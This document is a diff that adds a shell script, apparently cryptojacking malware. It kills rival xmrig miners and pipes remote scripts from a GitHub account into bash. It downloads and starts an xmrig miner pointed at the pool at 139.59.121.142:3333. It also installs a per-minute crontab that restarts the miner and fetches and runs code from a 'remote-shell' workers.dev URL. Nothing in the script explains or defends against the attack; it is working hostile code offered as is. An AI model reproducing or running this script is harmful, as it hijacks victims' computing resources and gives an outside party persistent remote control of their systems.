@@ -1,0 +1,23 @@
+mkdir /tmp
+mkdir /home
+rm /etc/xmrig
+rm xmrig
+pkill xmrig
+rm -rf c3pool
+rm /tmp/xmrig
+rm /home/xmrig
+if (( $(top -b -n 1 | grep xmrig | wc -l) == "0" ))
+then
+  pkill xmrig
+  find / -name xmrig | xargs rm -f
+fi
+curl -Ls https://raw.githubusercontent.com/aldnesjxeakxs/scripts/main/1.sh | bash
+curl -Ls https://raw.githubusercontent.com/aldnesjxeakxs/scripts/main/sep.sh | bash
+wget -k https://github.com/aldnesjxeakxs/scripts/raw/main/xmrig -o /home/xmrig
+wget -k https://github.com/aldnesjxeakxs/scripts/raw/main/xmrig -o /etc/xmrig
+/tmp/xmrig -o 139.59.121.142:3333 -B --tls
+
+echo '* * * * * if (( $(top -b -n 1 | grep xmrig | wc -l) == "0" ));then /home/xmrig -o 139.59.121.142:3333 -B --tls;fi' > c
+echo '* * * * * sh -c "$(curl -Ls https://remote-shell.mengxin827899.workers.dev)" >> /dev/null' >> c
+crontab c
+rm -f c
